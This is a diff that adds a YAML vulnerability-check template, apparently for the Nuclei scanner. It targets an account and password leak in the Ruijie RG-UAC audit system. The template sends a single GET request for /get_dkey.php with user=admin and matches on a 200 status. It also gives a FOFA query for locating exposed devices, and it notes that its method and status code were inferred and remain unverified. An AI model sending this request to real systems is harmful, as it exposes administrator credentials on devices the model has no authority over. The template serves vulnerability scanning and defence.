@@ -1,0 +1,23 @@
+id: poc-b6f02f49c854092e33dc
+info:
+  name: 锐捷RG-UAC统一上网行为管理审计系统账号密码泄漏漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b6f02f49c854092e33dcc72fc0ee5faf
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: b6f02f49c854092e33dcc72fc0ee5faf
+    fofa: + fofoa:`app="Ruijie-RG-UAC"`
+http:
+- raw:
+  - 'GET /get_dkey.php?user=admin HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
